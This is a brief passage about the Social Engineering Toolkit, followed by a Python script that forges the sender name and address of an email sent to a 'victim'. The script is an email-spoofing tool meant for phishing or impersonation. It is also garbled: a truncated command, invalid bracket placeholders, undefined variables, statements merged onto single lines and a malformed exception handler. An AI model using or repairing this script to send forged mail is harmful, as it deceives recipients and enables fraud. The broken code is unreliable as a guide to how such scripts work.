The Social Engineer Toolkit

The Social Engineering Toolkit (SET), written by security leader David Kennedy, is designed to perform advanced attacks against human weaknesses; this is known as social engineering. Kali Linux already has this tool preinstalled by default. To run it, you will need to execute setoolkit in your terminal window: root@kali:/# setoolki
folow the instruction

```python
password = [Your SMTP account password] #Spoofed e-mail information 
spoofed_email = [fake email address]
#Spoofed full name 
spoofed_name = 'John Doe' 
#Victim e-mail address 
victim_email = [victim email address] 
# E-mail subject 
subject= "this is a subject\n" 
# E-mail body message 
body = "This is a body." 
header = ('To:' + victim_email + '\n' +'From: ' + spoofed_name + ' <' + spoofed_email + '>' + '\n' + 'Subject:' + subject) message = (header + '\n\n' + body + '\n\n')
try: 
	session = smtplib.SMTP_SSL([smtp server domain],[smtp server port number]) 
    session.ehlo() session.login(username, password)
	session.sendmail(sender_email, victim_email, message)
	session.quit()
	 print "Email Sent With Success!"
except:
	smtplib.SMTPException: print "Error: Unable To Send The Email!"

```